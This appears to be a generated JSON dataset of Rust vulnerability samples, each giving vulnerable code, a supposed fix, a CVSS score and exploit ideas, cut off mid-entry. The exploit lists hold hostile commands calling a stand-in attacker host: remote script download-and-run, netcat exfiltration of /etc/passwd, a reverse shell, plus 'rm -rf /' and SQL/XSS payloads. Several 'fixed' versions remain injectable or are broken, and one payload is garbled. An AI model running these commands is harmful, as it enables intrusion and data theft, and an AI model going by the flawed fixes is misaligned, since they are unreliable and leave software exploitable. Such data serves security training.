{
    "rust_0": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "use std::process::Command;\n\nfn main() {\n    let user_input = \"echo hello\"; // Simulate user input\n    Command::new(\"sh\")\n        .arg(\"-c\")\n        .arg(user_input)\n        .spawn()\n        .expect(\"Failed to execute command\");\n}",
        "cvss_score": 7.2,
        "fixed_code": "use std::process::Command;\n\nfn main() {\n    let user_input = \"echo hello\"; // Simulate user input\n    Command::new(\"echo\")\n        .arg(user_input)\n        .spawn()\n        .expect(\"Failed to execute command\");\n}",
        "exploit_ways": [
            "User could input 'whoami; id' to see current permissions and user ID.",
            "Could use 'cat /etc/shadow' to attempt reading sensitive files with elevated privileges.",
            "Could chain commands like 'touch /root/testfile' to create a file in the root directory."
        ]
    },
    "rust_1": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "use std::fs;\n\nfn read_file(path: &str) -> Result<String, std::io::Error> {\n    fs::read_to_string(path)\n}",
        "cvss_score": 7.5,
        "fixed_code": "use std::fs;\nuse std::path::{Path, PathBuf};\n\nfn read_file(base_dir: &str, path: &str) -> Result<String, std::io::Error> {\n    let base_path = Path::new(base_dir);\n    let full_path = base_path.join(path);\n\n    if !full_path.starts_with(base_path) {\n        return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, \"Path traversal attempt detected\"));\n    }\n\n    fs::read_to_string(full_path)\n}",
        "exploit_ways": [
            "An attacker can provide a path like '../../etc/passwd' to read the system's password file.",
            "Using '..%2f' instead of '../' in URL-encoded input can bypass simple checks and access files outside the intended directory.",
            "Supplying a long relative path with many '../' segments might exploit any oversight in path validation logic."
        ]
    },
    "rust_2": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "use std::process::Command;\n\nfn execute_command(user_input: &str) {\n    let output = Command::new(\"sh\")\n        .arg(\"-c\")\n        .arg(user_input)\n        .output()\n        .expect(\"Failed to execute command\");\n    println!(\"Output: {}\", String::from_utf8_lossy(&output.stdout));\n}\n\nfn main() {\n    let user_input = \"echo Hello, World!\"; // Simulated user input\n    execute_command(user_input);\n}",
        "cvss_score": 7.5,
        "fixed_code": "use std::process::Command;\n\nfn execute_command(user_input: &str) {\n    if user_input.trim() == \"echo Hello, World!\" {\n        let output = Command::new(\"sh\")\n            .arg(\"-c\")\n            .arg(user_input)\n            .output()\n            .expect(\"Failed to execute command\");\n        println!(\"Output: {}\", String::from_utf8_lossy(&output.stdout));\n    } else {\n        println!(\"Command not allowed\");\n    }\n}\n\nfn main() {\n    let user_input = \"echo Hello, World!\"; // Simulated user input\n    execute_command(user_input);\n}",
        "exploit_ways": [
            "User could input 'sudo rm -rf /' to delete all files.",
            "Could use 'whoami; sudo su' to gain root access.",
            "Could chain commands like 'ls; cat /etc/shadow' to leak sensitive files."
        ]
    },
    "rust_3": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "use std::process::Command;\n\nstruct UnsafeExecutor {\n    command: String,\n}\n\nimpl UnsafeExecutor {\n    fn new(cmd: &str) -> Self {\n        UnsafeExecutor {\n            command: cmd.to_string(),\n        }\n    }\n\n    fn execute(&self) {\n        Command::new(\"sh\")\n               .arg(&self.command)\n               .output()\n               .expect(\"Failed to execute command\");\n    }\n}\n\nfn main() {\n    let executor = UnsafeExecutor::new(\"echo Hello, world!\");\n    executor.execute();\n}",
        "cvss_score": 8.2,
        "fixed_code": "use std::process::Command;\n\nstruct SafeExecutor {\n    command: String,\n}\n\nimpl SafeExecutor {\n    fn new(cmd: &str) -> Self {\n        SafeExecutor {\n            command: cmd.to_string(),\n        }\n    }\n\n    fn execute(&self) {\n        let parts: Vec<&str> = self.command.split_whitespace().collect();\n        Command::new(parts[0])\n               .args(&parts[1..])\n               .output()\n               .expect(\"Failed to execute command\");\n    }\n}\n\nfn main() {\n    let executor = SafeExecutor::new(\"echo Hello, world!\");\n    executor.execute();\n}",
        "exploit_ways": [
            "An attacker could input 'rm -rf /' to delete all files on the system.",
            "Could use 'curl http://attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Chaining commands like 'ls; cat /etc/passwd' can leak sensitive information."
        ]
    },
    "rust_4": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "use std::io;\\n\\nfn main() {\\n    println!(\"Enter your name:\");\\n    let mut input = String::new();\\n    io::stdin().read_line(&mut input).expect(\"Failed to read line\");\\n    println!(\"Hello, {}!\", input);\\n}",
        "cvss_score": 4.3,
        "fixed_code": "use std::io;\\n\\nfn main() {\\n    println!(\"Enter your name:\");\\n    let mut input = String::new();\\n    io::stdin().read_line(&mut input).expect(\"Failed to read line\");\\n    let escaped_input = html_escape::encode_text(input.trim());\\n    println!(\"Hello, {}!\", escaped_input);\\n}",
        "exploit_ways": [
            "An attacker could input '<script>alert(1)</script>' to execute a JavaScript alert in the user's browser.",
            "Malicious code like '<img src=x onerror=alert(document.cookie)>' could be used to steal cookies or other sensitive information.",
            "By injecting script tags, an attacker can perform actions on behalf of the victim without their knowledge."
        ]
    },
    "rust_5": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "fn get_user_by_id(id: &str) -> String {\n    let query = format!(\"SELECT * FROM users WHERE id = {}\", id);\n    // Simulate database interaction\n    query\n}",
        "cvss_score": 7.5,
        "fixed_code": "fn get_user_by_id(id: &str) -> String {\n    use std::fmt::Write;\n    let mut query = String::from(\"SELECT * FROM users WHERE id = \");\n    write!(query, \"{}\", id).unwrap(); // Assuming proper parameterization is handled by the DB library\n    // Simulate database interaction with safe parameters\n    query\n}",
        "exploit_ways": [
            "An attacker can input '1 OR 1=1' to retrieve all user records.",
            "They could inject '; DROP TABLE users --' to delete the users table.",
            "Using '1; SELECT password FROM users WHERE username = 'admin'' could expose admin credentials."
        ]
    },
    "rust_6": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "use std::io::{self, Write};\n\nfn main() {\n    println!(\"Enter command to execute:\");\n    io::stdout().flush().unwrap();\n    let mut input = String::new();\n    io::stdin().read_line(&mut input).expect(\"Failed to read line\");\n    let output = std::process::Command::new(\"sh\")\n        .arg(\"-c\")\n        .arg(input.trim())\n        .output()\n        .expect(\"Failed to execute command\");\n    println!(\"Output: {}\", String::from_utf8_lossy(&output.stdout));\n}",
        "cvss_score": 9.0,
        "fixed_code": "use std::io::{self, Write};\n\nfn main() {\n    let allowed_commands = [\"echo\", \"whoami\"];\n    println!(\"Enter command to execute (allowed commands: {:?}):\", allowed_commands);\n    io::stdout().flush().unwrap();\n    let mut input = String::new();\n    io::stdin().read_line(&mut input).expect(\"Failed to read line\");\n    let cmd: Vec<&str> = input.trim().split_whitespace().collect();\n\n    if allowed_commands.contains(&cmd[0]) {\n        let output = std::process::Command::new(cmd[0])\n            .args(&cmd[1..])\n            .output()\n            .expect(\"Failed to execute command\");\n        println!(\"Output: {}\", String::from_utf8_lossy(&output.stdout));\n    } else {\n        println!(\"Command not allowed.\")\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "rust_7": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "fn main() {\n    use std::fs;\n    fs::write(\"/etc/passwd\", \"attacker:x:0:0::/:/bin/bash\\\").expect(\"Failed to write file\");\n}",
        "cvss_score": 7.5,
        "fixed_code": "fn main() {\n    println!(\"This operation requires root privileges and is not allowed.\");\n}",
        "exploit_ways": [
            "An attacker could run the program as a regular user to gain root access by overwriting /etc/passwd.",
            "The vulnerable code can be compiled and executed in environments with improper file permissions, leading to unauthorized privilege escalation.",
            "By modifying the /etc/passwd file, an attacker could add multiple backdoor accounts for future unauthorized access."
        ]
    },
    "rust_8": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "use std::process::Command;\n\nfn execute_user_command(user_input: &str) {\n    let parts: Vec<&str> = user_input.split_whitespace().collect();\n    if !parts.is_empty() {\n        let mut command = Command::new(parts[0]);\n        for arg in &parts[1..] {\n            command.arg(arg);\n        }\n        match command.output() {\n            Ok(output) => println!(\"{}\", String::from_utf8_lossy(&output.stdout)),\n            Err(e) => eprintln!(\"Failed to execute command: {}\", e),\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "use std::process::Command;\n\nfn execute_user_command(user_input: &str) {\n    let allowed_commands = [\"ls\", \"whoami\"];\n    let parts: Vec<&str> = user_input.split_whitespace().collect();\n    if !parts.is_empty() && allowed_commands.contains(&parts[0]) {\n        let mut command = Command::new(parts[0]);\n        for arg in &parts[1..] {\n            command.arg(arg);\n        }\n        match command.output() {\n            Ok(output) => println!(\"{}\", String::from_utf8_lossy(&output.stdout)),\n            Err(e) => eprintln!(\"Failed to execute command: {}\", e),\n        }\n    } else {\n        eprintln!(\"Command not allowed\");\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "rust_9": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nasync fn transfer_funds(data: web::Form<TransferData>) -> HttpResponse {\n    // Simulate transferring funds to another user\n    let _ = format!(\"Transferring {} funds to user {}\", data.amount, data.to_user);\n    HttpResponse::Ok().body(\"Funds transferred successfully\")\n}\n\n#[derive(serde::Deserialize)]\nstruct TransferData {\n    amount: String,\n    to_user: String,\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| {\n        App::new()\n            .route(\"/transfer\", web::post().to(transfer_funds))\n    })\n    .bind(\"127.0.0.1:8080\")?\n    .run()\n    .await\n}",
        "cvss_score": 6.5,
        "fixed_code": "use actix_web::{web, App, HttpResponse, HttpServer, cookie::Cookie};\nuse rand::Rng;\n\nasync fn transfer_funds(data: web::Form<TransferData>, cookies: web::CookieJar) -> HttpResponse {\n    let csrf_token = if let Some(cookie) = cookies.get(\"csrf-token\") {\n        cookie.value().to_string()\n    } else {\n        return HttpResponse::Unauthorized().body(\"CSRF token missing\");\n    };\n\n    if data.csrf_token != csrf_token {\n        return HttpResponse::Forbidden().body(\"Invalid CSRF token\");\n    }\n\n    // Simulate transferring funds to another user\n    let _ = format!(\"Transferring {} funds to user {}\", data.amount, data.to_user);\n    HttpResponse::Ok().body(\"Funds transferred successfully\")\n}\n\n#[derive(serde::Deserialize)]\nstruct TransferData {\n    amount: String,\n    to_user: String,\n    csrf_token: String,\n}\n\nasync fn generate_csrf_token() -> String {\n    let mut rng = rand::thread_rng();\n    (0..32)\n        .map(|_| rng.sample(rand::distributions::Alphanumeric) as char)\n        .collect()\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| {\n        let csrf_token = generate_csrf_token();\n        App::new()\n            .wrap_fn(move |req, srv| {\n                let mut response = srv.call(req).await.unwrap();\n                if let Some(cookie) = Cookie::build(\"csrf-token\", &csrf_token)\n                    .path(\"/\")\n                    .secure(true)\n                    .http_only(true)\n                    .finish()\n                {\n                    response.add_cookie(&cookie);\n                }\n                Ok(response)\n            })\n            .route(\"/transfer\", web::post().to(transfer_funds))\n    })\n    .bind(\"127.0.0.1:8080\")?\n    .run()\n    .await\n}",
        "exploit_ways": [
            "An attacker can craft a malicious link or form that, when visited by an authenticated user, automatically submits a request to transfer funds.",
            "By tricking the user into clicking on a specially crafted URL or image embedded in an email or forum post, the attacker can perform actions without the user's explicit consent.",
            "The attacker could use a CSRF token prediction or brute force attack if the tokens are predictable or weakly generated."
        ]
    },
    "rust_10": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "use std::process::Command;\n\nfn execute_command(cmd: &str) -> String {\n    let output = Command::new(\"sh\")\n        .arg(&[\"-c\", cmd].concat())\n        .output()\n        .expect(\"failed to execute process\");\n    String::from_utf8_lossy(&output.stdout).to_string()\n}\n\nfn main() {\n    let user_input = std::env::args().nth(1).unwrap_or(String::new());\n    println!(\"Command output:\\n{}\", execute_command(&user_input));\n}",
        "cvss_score": 7.5,
        "fixed_code": "use std::process::Command;\n\nfn execute_command(cmd: &str) -> String {\n    let output = Command::new(\"sh\")\n        .arg(&[\"-c\", \"echo \", cmd].concat())\n        .output()\n        .expect(\"failed to execute process\");\n    String::from_utf8_lossy(&output.stdout).to_string()\n}\n\nfn main() {\n    let user_input = std::env::args().nth(1).unwrap_or(String::new());\n    println!(\"Command output:\\n{}\", execute_command(&user_input));\n}",
        "exploit_ways": [
            "User could input '; rm -rf /' to delete all files on the system.",
            "Could use '; curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like '; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "rust_11": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nasync fn change_email(data: web::Form<ChangeEmailData>) -> HttpResponse {\n    // Simulate changing the user's email address without CSRF protection\n    format!(\"Email changed to: {}\", data.email)\n}\n\n#[derive(serde::Deserialize)]\nstruct ChangeEmailData {\n    email: String,\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| {\n        App::new()\n            .route(\"/change-email\", web::post().to(change_email))\n    })\n    .bind(\"127.0.0.1:8080\")?\n    .run()\n    .await\n}",
        "cvss_score": 6.5,
        "fixed_code": "use actix_web::{web, App, HttpResponse, HttpServer};\nuse actix_session::Session;\nuse rand::Rng;\nuse serde::Deserialize;\n\nasync fn change_email(data: web::Form<ChangeEmailData>, session: Session) -> HttpResponse {\n    let csrf_token = session.get::<String>(\"csrf_token\").unwrap_or_default();\n    if data.csrf_token != csrf_token {\n        return HttpResponse::Unauthorized().body(\"Invalid CSRF token\")\n    }\n    // Simulate changing the user's email address with CSRF protection\n    format!(\"Email changed to: {}\", data.email)\n}\n\n#[derive(Deserialize)]\nstruct ChangeEmailData {\n    email: String,\n    csrf_token: String,\n}\n\nasync fn index(session: Session) -> HttpResponse {\n    let mut rng = rand::thread_rng();\n    let csrf_token: String = (0..32).map(|_| rng.sample(rand::distributions::Alphanumeric)).map(char::from).collect();\n    session.set(\"csrf_token\", &csrf_token);\n    format!(\"<form action=\"/change-email\" method=\"POST\">\n              <input type=\"hidden\" name=\"csrf_token\" value={}>\n              <input type=\"email\" name=\"email\">\n              <button type=\"submit\">Change Email</button>\n            </form>\", csrf_token)\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| {\n        App::new()\n            .wrap(actix_session::CookieSession::signed(&[0; 32]).secure(false))\n            .route(\"/\", web::get().to(index))\n            .route(\"/change-email\", web::post().to(change_email))\n    })\n    .bind(\"127.0.0.1:8080\")?\n    .run()\n    .await\n}",
        "exploit_ways": [
            "An attacker can trick a logged-in user into clicking a malicious link to change their email address without their knowledge.",
            "By sending a crafted form submission from another domain, an attacker could change the victim's email address if not protected by CSRF tokens.",
            "Using social engineering tactics, an attacker could deceive the user into submitting a form that changes their account details in the background."
        ]
    },
    "rust_12": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "fn login(username: &str, password: &str) -> bool {\n    username == \"admin\" && password == \"password123\"\n}",
        "cvss_score": 6.5,
        "fixed_code": "use argon2::Config;\n\nfn verify_password(hash: &str, password: &str) -> bool {\n    let config = Config::default();\n    argon2::verify_encoded(hash, password.as_bytes()).unwrap_or(false)\n}\n\nfn login(username: &str, password: &str) -> bool {\n    let stored_hash = \"$argon2i$v=19$m=4096,t=3,p=1$Qw==\"; // Example hash placeholder\n    username == \"admin\" && verify_password(stored_hash, password)\n}",
        "exploit_ways": [
            "An attacker can use the hardcoded credentials 'admin' and 'password123' to gain unauthorized access.",
            "By knowing or guessing the default admin username, an attacker can attempt brute force attacks on the password.",
            "If the application does not have proper logging, attackers may exploit this vulnerability without detection."
        ]
    },
    "rust_13": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "use std::fs::File;\nuse std::io::{self, Read};\n\nfn read_file(path: &str) -> io::Result<String> {\n    let mut file = File::open(path)?;\n    let mut contents = String::new();\n    file.read_to_string(&mut contents)?;\n    Ok(contents)\n}",
        "cvss_score": 7.5,
        "fixed_code": "use std::fs::File;\nuse std::io::{self, Read};\nuse std::path::{Path, PathBuf};\n\nfn read_file(base_path: &str, path: &str) -> io::Result<String> {\n    let base = Path::new(base_path);\n    let absolute_path = base.join(path).canonicalize()?;\n    if !absolute_path.starts_with(base) {\n        return Err(io::Error::new(io::ErrorKind::InvalidInput, \"Path traversal attempt detected\"));\n    }\n    let mut file = File::open(&absolute_path)?;\n    let mut contents = String::new();\n    file.read_to_string(&mut contents)?;\n    Ok(contents)\n}",
        "exploit_ways": [
            "An attacker can input '../etc/passwd' to read the system's password file.",
            "Using '../../secret/file.txt' could expose sensitive internal files.",
            "Crafting a path like '../../../home/user/.ssh/id_rsa' might allow access to private SSH keys."
        ]
    },
    "rust_14": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "use std::process::Command;\n\nstruct UnsafeExecutor {\n    command: String,\n}\n\nimpl UnsafeExecutor {\n    fn new(cmd: &str) -> Self {\n        UnsafeExecutor { command: cmd.to_string() }\n    }\n\n    fn execute(&self) {\n        let parts: Vec<&str> = self.command.split_whitespace().collect();\n        let mut child = Command::new(parts[0])\n            .args(&parts[1..])\n            .spawn()\n            .expect(\"Failed to execute command\");\n\n        let _output = child.wait_with_output().expect(\"Failed to wait on child\");\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "use std::process::Command;\n\nstruct SafeExecutor {\n    program: String,\n    args: Vec<String>,\n}\n\nimpl SafeExecutor {\n    fn new(program: &str, args: &[&str]) -> Self {\n        SafeExecutor { \n            program: program.to_string(),\n            args: args.iter().map(|&s| s.to_string()).collect(),\n        }\n    }\n\n    fn execute(&self) {\n        let mut child = Command::new(&self.program)\n            .args(&self.args)\n            .spawn()\n            .expect(\"Failed to execute command\");\n\n        let _output = child.wait_with_output().expect(\"Failed to wait on child\");\n    }\n}",
        "exploit_ways": [
            "An attacker could input 'ls; rm -rf /' to list files and then delete all files.",
            "Could use 'echo malicious_code > malware.sh; chmod +x malware.sh; ./malware.sh' to create and execute a malicious script.",
            "A chained command like 'cat /etc/passwd | nc attacker.com 1234' could send system information to an external server."
        ]
    },
    "rust_15": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "pub struct SafeString {\n    buffer: [u8; 16],\n}\n\nimpl SafeString {\n    pub fn new() -> Self {\n        SafeString { buffer: [0; 16] }\n    }\n\n    pub unsafe fn set(&mut self, data: &[u8]) {\n        std::ptr::copy_nonoverlapping(data.as_ptr(), self.buffer.as_mut_ptr(), data.len());\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "pub struct SafeString {\n    buffer: [u8; 16],\n}\n\nimpl SafeString {\n    pub fn new() -> Self {\n        SafeString { buffer: [0; 16] }\n    }\n\n    pub fn set(&mut self, data: &[u8]) {\n        if data.len() > self.buffer.len() {\n            panic!(\"Data too long\");\n        }\n        self.buffer[..data.len()].copy_from_slice(data);\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a data slice longer than 16 bytes to overwrite adjacent memory.",
            "By overwriting the return address, an attacker could redirect execution to arbitrary code.",
            "Overwriting critical data structures in memory could lead to unpredictable behavior or crashes."
        ]
    },
    "rust_17": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "use serde_json;\n\nfn main() {\n    let json_data = String::from(\"{\\\"typ\\\":\\\"PicklePayload\\\", \\\"value\\\":\\\"O:std::fs::File:\\x0a:\\x00:\\x13inner\\nRtJNSA5OS4xLjAuMC9mcy9GaWxlU3RyZWFtOmo6cHJpdmF0ZV9maWxlc3RyZWFtX2lubmVyOjo6cGk6cmlnaHRzX3Jvb3Q6OkJ1aWx0aW5nUHJvamVjdDogTGl0RmlsZXN0cmVhbToxLjAuMC9saXRfZmlsZXN0cmVhbTpGaWxlU3RyZWFtOjIuNi4wL2ZpbGVzdHJlYW06SGFuZGxlOlJhbi9mcy9MaXRFbnRyaW5lOjEwLjAuMC9naXRsOjAuaGlkZV9zcmMvZmlsZXN0cmVhbTovc291cmNlczogQWJzdHJhY3RDb250ZW50cy9maWxlc3RyZWFtL1BhdGg6NS44LjAvaGlkZV9zcmMvZmlsZXN0cmVhbTovcGF0aDogcGF0aDozLjAuMC9mb2xsb3c6cHJpdmF0ZV9mYWN0b3J5OjpibG9ja19pdGVyYXRvcjo6dW5kcmVmIG86MTAuMTAuMC9oaWRlX3NyYy9maWxlc3RyZWFtOi9wYXRoOiBydW5fbWFuYWduZWQ6cHJpdmF0ZV9mYWN0b3J5OjpibG9ja19pdGVyYXRvcjo6dW5kcmVmIHRwOiJmcy9GaWxlU3RyZWFtOjEwLjAuMC9maWxlc3RyZWFtOiRob2RuZGxlOlJhbi9mcy9MaXRFbnRyaW5lOjEwLjAuMC9naXRsOjAuaGlkZV9zcmMvZmlsZXN0cmVhbTovc291cmNlczogQWJzdHJhY3RDb250ZW50cy9maWxlc3RyZWFtL1BhdGg6NS44LjAvaGlkZV9zcmMvZmlsZXN0cmVhbTovcGF0aDogcGF0aDozLjAuMC9mb2xsb3c6cHJpdmF0ZV9mYWN0b3J5OjpibG9ja19pdGVyYXRvcjo6dW5kcmVmIHRwOiJmbzogL3RtcC9xdWlja19hZ2VudCI=\\\"}\");\n    let deserialized: serde_json::Value = serde_json::from_str(&json_data).unwrap();\n    println!(\"Deserialized: {:?}\", deserialized);\n}",
        "cvss_score": 7.5,
        "fixed_code": "use serde_json;\n\nfn main() {\n    let json_data = String::from(\"{\\\"typ\\\":\\\"SafePayload\\\", \\\"value\\\":\\\"safe_value\\\"}\");\n    if let Ok(deserialized) = serde_json::from_str::<serde_json::Value>(&json_data) {\n        if deserialized.get(\\\"typ\\\").and_then(|v| v.as_str()) == Some(\\\"SafePayload\\\") {\n            println!(\\\"Deserialized: {:?}\\\", deserialized);\n        } else {\n            println!(\\\"Invalid payload type\\\");\n        }\n    } else {\n        println!(\\\"Failed to deserialize JSON\\\");\n    }\n}",
        "exploit_ways": [
            "Attacker could craft a malicious payload that, when deserialized, executes arbitrary code.",
            "By manipulating the 'value' field with a specially crafted serialized object, an attacker might be able to exploit vulnerabilities in the target system.",
            "If the application trusts and processes all incoming JSON data without proper validation, it can lead to remote code execution or other critical security issues."
        ]
    },
    "rust_18": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "use bincode::{deserialize, serialized_size};\nfn deserialize_data(data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {\n    let _deserialized: MyStruct = deserialize(data)?;\n    Ok(())\n}\npub struct MyStruct {\n    pub value: String,\n}",
        "cvss_score": 7.5,
        "fixed_code": "use bincode::{deserialize, serialized_size};\nuse serde::de::DeserializeOwned;\nfn deserialize_data<T: DeserializeOwned>(data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {\n    let _deserialized: T = deserialize(data)?;\n    Ok(())\n}\npub struct MyStruct {\n    pub value: String,\n}",
        "exploit_ways": [
            "An attacker could send specially crafted serialized data to execute arbitrary code on the server.",
            "The vulnerability can be used to perform privilege escalation by deserializing a malicious payload that grants administrative access.",
            "By injecting serialized objects, an attacker might be able to overwrite or corrupt critical application state."
        ]
    },
    "rust_19": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "use std::process::Command;\n\nfn main() {\n    let user_input = String::from(\"sudo rm -rf /\");\n    Command::new(\"sh\")\n        .arg(\"-c\")\n        .arg(user_input)\n        .output()\n        .expect(\"Failed to execute command\");\n}",
        "cvss_score": 7.5,
        "fixed_code": "use std::process::Command;\n\nfn main() {\n    let safe_command = \"echo \\\"Safe command\\\"\";\n    Command::new(\"sh\")\n        .arg(\"-c\")\n        .arg(safe_command)\n        .output()\n        .expect(\"Failed to execute command\");\n}",
        "exploit_ways": [
            "An attacker could input 'sudo rm -rf /' to delete all files on the system.",
            "Could provide a reverse shell command like 'nc attacker.com 1234 -e /bin/sh' for remote access.",
            "Could use 'sudo passwd' followed by a new password to gain root access."
        ]
    },
    "rust_20": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "use serde_json;\n\nfn deserialize_data(data: &str) -> Result<(), Box<dyn std::error::Error>> {\n    let deserialized: serde_json::Value = serde_json::from_str(data)?;\n    Ok(())\n}",
        "cvss_score": 7.5,
        "fixed_code": "use serde_json;\n\nfn deserialize_data<T: serde::de::DeserializeOwned>(data: &str) -> Result<T, Box<dyn std::error::Error>> {\n    let deserialized: T = serde_json::from_str(data)?;\n    Ok(deserialized)\n}",
        "exploit_ways": [
            "An attacker can inject malicious JSON that exploits vulnerabilities in the application's handling of deserialized data.",
            "They could use crafted JSON to manipulate application logic, leading to unauthorized actions or data leaks.",
            "By sending specifically crafted JSON payloads, an attacker might be able to exploit type confusion issues, resulting in code execution."
        ]
    },
    "rust_21": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "fn vulnerable_query(user_input: &str) -> String {\n    format!(\"SELECT * FROM users WHERE name = '{}'\", user_input)\n}",
        "cvss_score": 7.5,
        "fixed_code": "use sqlx::prelude::*;\nuse sqlx::SqlitePool;\n\nasync fn safe_query(pool: &SqlitePool, user_input: &str) -> Result<String, sqlx::Error> {\n    let query = \"SELECT * FROM users WHERE name = ?\";\n    let row = sqlx::query(query)\n        .bind(user_input)\n        .fetch_one(pool).await?\n        .get::<String, _>(0);\n    Ok(row)\n}",
        "exploit_ways": [
            "An attacker can input \"admin' OR '1'='1\" to retrieve all users.",
            "They can use a payload like \"admin'; DROP TABLE users; -- \" to drop the users table.",
            "Input such as \"admin'; SELECT * FROM secret_data; -- \" can be used to extract data from other tables."
        ]
    },
    "rust_22": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "use std::process::Command;\n\nstruct Executor {\n    command: String,\n}\n\nimpl Executor {\n    fn new(command: String) -> Executor {\n        Executor { command }\n    }\n\n    fn run(&self) {\n        let parts: Vec<&str> = self.command.split_whitespace().collect();\n        if let Some(&program) = parts.first() {\n            let mut cmd = Command::new(program);\n            for arg in &parts[1..] {\n                cmd.arg(arg);\n            }\n            match cmd.output() {\n                Ok(_) => println!(\"Command executed successfully.\"),\n                Err(e) => eprintln!(\"Failed to execute command: {}\", e),\n            }\n        }\n    }\n}\n\nfn main() {\n    let user_input = String::from(\"echo hello; rm -rf /\"); // Simulated user input\n    let executor = Executor::new(user_input);\n    executor.run();\n}",
        "cvss_score": 8.5,
        "fixed_code": "use std::process::Command;\n\nstruct Executor {\n    program: String,\n    args: Vec<String>,\n}\n\nimpl Executor {\n    fn new(program: String, args: Vec<String>) -> Executor {\n        Executor { program, args }\n    }\n\n    fn run(&self) {\n        let mut cmd = Command::new(&self.program);\n        for arg in &self.args {\n            cmd.arg(arg);\n        }\n        match cmd.output() {\n            Ok(_) => println!(\"Command executed successfully.\"),\n            Err(e) => eprintln!(\"Failed to execute command: {}\", e),\n        }\n    }\n}\n\nfn main() {\n    let user_input = String::from(\"echo\"); // Simulated program input\n    let args = vec![String::from(\"hello\")]; // Simulated arguments input\n    let executor = Executor::new(user_input, args);\n    executor.run();\n}",
        "exploit_ways": [
            "User could input 'rm' as the program and '-rf /' as an argument to delete system files.",
            "Could use 'curl attacker.com/malware.sh' as a program and '| sh' as an argument to execute remote malicious code.",
            "Could chain commands by providing multiple arguments to achieve arbitrary command execution."
        ]
    },
    "rust_23": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "use std::collections::HashMap;\n\nstruct User {\n    username: String,\n    password_hash: u64,\n}\n\nfn hash_password(password: &str) -> u64 {\n    let mut hash = 0;\n    for byte in password.bytes() {\n        hash ^= (hash << 5) + ((hash >> 27) ^ byte as u64);\n    }\n    hash\n}\n\nfn main() {\n    let mut users: HashMap<String, User> = HashMap::new();\n    users.insert(\n        \"admin\".to_string(),\n        User {\n            username: \"admin\".to_string(),\n            password_hash: hash_password(\"securepassword123\"),\n        },\n    );\n\n    let input_username = \"admin\";\n    let input_password = \"securepassword123\";\n    if let Some(user) = users.get(input_username) {\n        if user.password_hash == hash_password(input_password) {\n            println!(\"Login successful!\");\n        } else {\n            println!(\"Invalid password.\");\n        }\n    } else {\n        println!(\"User not found.\");\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "use std::collections::HashMap;\nuse argon2::{Argon2, Config};\n\nstruct User {\n    username: String,\n    password_hash: Vec<u8>,\n}\n\nfn hash_password(password: &str) -> Vec<u8> {\n    let config = Config::default();\n    let salt = b\"somesalt\";\n    let mut hash = vec![0; 32];\n    Argon2::default().hash_password_into(password.as_bytes(), salt, &config, &mut hash).unwrap();\n    hash\n}\n\nfn verify_password(hash: &[u8], password: &str) -> bool {\n    let config = Config::default();\n    let salt = b\"somesalt\";\n    Argon2::default().verify_password(password.as_bytes(), &config, hash).is_ok()\n}\n\nfn main() {\n    let mut users: HashMap<String, User> = HashMap::new();\n    users.insert(\n        \"admin\".to_string(),\n        User {\n            username: \"admin\".to_string(),\n            password_hash: hash_password(\"securepassword123\"),\n        },\n    );\n\n    let input_username = \"admin\";\n    let input_password = \"securepassword123\";\n    if let Some(user) = users.get(input_username) {\n        if verify_password(&user.password_hash, input_password) {\n            println!(\"Login successful!\");\n        } else {\n            println!(\"Invalid password.\");\n        }\n    } else {\n        println!(\"User not found.\");\n    }\n}",
        "exploit_ways": [
            "An attacker could brute-force the hash due to the weak and non-salted hashing algorithm.",
            "If the attacker gains access to the user database, they can try common passwords since the hash is unsalted and simple.",
